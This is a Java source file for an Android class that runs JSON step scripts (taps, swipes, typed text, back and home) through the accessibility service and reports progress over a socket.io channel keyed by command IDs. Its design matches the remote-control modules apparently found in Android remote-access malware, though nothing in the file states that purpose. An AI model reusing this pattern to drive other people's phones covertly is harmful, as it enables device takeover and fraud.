package com.fason.app.features.automation;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Bundle;
import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import io.socket.client.Socket;

/**
 * AutomataManager — scripted UI automation over accessibility gestures.
 * Script = JSON array of steps: click(x,y), clickText(text), swipe(x1,y1,x2,y2,dur),
 * longPress(x,y), wait(ms), back(), home(), scrollForward(), type(text).
 */
public final class AutomataManager {
    private static volatile AutomataManager instance;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean running = new AtomicBoolean(false);
    private volatile AccessibilityService service;

    private AutomataManager() {}

    public static synchronized AutomataManager getInstance() {
        if (instance == null) instance = new AutomataManager();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService s) { this.service = s; }

    public boolean isRunning() { return running.get(); }

    public void stop() { running.set(false); }

    /** payload: {script: [...steps], name?} */
    public void run(JSONObject payload, String cmdId) {
        JSONArray steps = payload.optJSONArray("script");
        if (steps == null || steps.length() == 0) {
            reply(cmdId, false, "empty script", 0, 0);
            return;
        }
        String name = payload.optString("name", "unnamed");
        running.set(true);
        exec.execute(() -> {
            int ok = 0, fail = 0;
            try {
                for (int i = 0; i < steps.length() && running.get(); i++) {
                    JSONObject step = steps.optJSONObject(i);
                    if (step == null) continue;
                    boolean success = executeStep(step);
                    if (success) ok++; else fail++;
                    emitProgress(cmdId, name, i + 1, steps.length(), success);
                    Thread.sleep(step.optLong("wait", 300));
                }
            } catch (Exception ignored) {} finally {
                running.set(false);
                reply(cmdId, true, "script complete", ok, fail);
            }
        });
    }

    private boolean executeStep(JSONObject step) {
        String action = step.optString("action", "");
        switch (action) {
            case "click":       return click(step.optInt("x"), step.optInt("y"));
            case "clickText":   return clickText(step.optString("text", ""));
            case "swipe":       return swipe(step.optInt("x1"), step.optInt("y1"),
                                            step.optInt("x2"), step.optInt("y2"),
                                            step.optInt("duration", 300));
            case "longPress":   return longPress(step.optInt("x"), step.optInt("y"));
            case "wait":        try { Thread.sleep(step.optLong("ms", 500)); } catch (Exception ignored) {}
                                return true;
            case "back":        return back();
            case "home":        return home();
            case "scrollForward": return scroll(true);
            case "scrollBackward": return scroll(false);
            case "type":        return type(step.optString("text", ""));
            default:            return false;
        }
    }

    private boolean click(int x, int y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        AccessibilityService s = service;
        if (s == null) return false;
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription.Builder b = new GestureDescription.Builder();
        b.addStroke(new GestureDescription.StrokeDescription(p, 0, 50));
        return s.dispatchGesture(b.build(), null, null);
    }

    private boolean clickText(String text) {
        AccessibilityService s = service;
        if (s == null || text.isEmpty()) return false;
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        if (root == null) return false;
        List<AccessibilityNodeInfo> found = root.findAccessibilityNodeInfosByText(text);
        root.recycle();
        if (found == null || found.isEmpty()) return false;
        AccessibilityNodeInfo target = found.get(0);
        boolean ok = false;
        while (target != null) {
            if (target.isClickable()) { ok = target.performAction(AccessibilityNodeInfo.ACTION_CLICK); break; }
            target = target.getParent();
        }
        for (AccessibilityNodeInfo n : found) n.recycle();
        return ok;
    }

    private boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < 24) return false;
        AccessibilityService s = service;
        if (s == null) return false;
        Path p = new Path();
        p.moveTo(x1, y1);
        p.lineTo(x2, y2);
        GestureDescription.Builder b = new GestureDescription.Builder();
        b.addStroke(new GestureDescription.StrokeDescription(p, 0, Math.max(50, duration)));
        return s.dispatchGesture(b.build(), null, null);
    }

    private boolean longPress(int x, int y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        AccessibilityService s = service;
        if (s == null) return false;
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription.Builder b = new GestureDescription.Builder();
        b.addStroke(new GestureDescription.StrokeDescription(p, 0, 1200));
        return s.dispatchGesture(b.build(), null, null);
    }

    private boolean back() {
        AccessibilityService s = service;
        return s != null && s.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }

    private boolean home() {
        AccessibilityService s = service;
        return s != null && s.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    private boolean scroll(boolean forward) {
        AccessibilityService s = service;
        if (s == null) return false;
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        if (root == null) return false;
        int action = forward ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
                             : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
        boolean ok = root.performAction(action);
        root.recycle();
        return ok;
    }

    private boolean type(String text) {
        AccessibilityService s = service;
        if (s == null || text.isEmpty()) return false;
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        if (root == null) return false;
        AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        root.recycle();
        if (focus == null) return false;
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        boolean ok = focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        focus.recycle();
        return ok;
    }

    private void emitProgress(String cmdId, String name, int done, int total, boolean success) {
        try {
            JSONObject o = new JSONObject();
            o.put("cmdId", cmdId);
            o.put("event", "progress");
            o.put("script", name);
            o.put("step", done);
            o.put("total", total);
            o.put("ok", success);
            emit(o);
        } catch (Exception ignored) {}
    }

    private void reply(String cmdId, boolean ok, String msg, int okCount, int failCount) {
        try {
            JSONObject o = new JSONObject();
            o.put("cmdId", cmdId);
            o.put("success", ok);
            o.put("message", msg);
            o.put("okCount", okCount);
            o.put("failCount", failCount);
            emit(o);
        } catch (Exception ignored) {}
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xAT", o);
    }
}
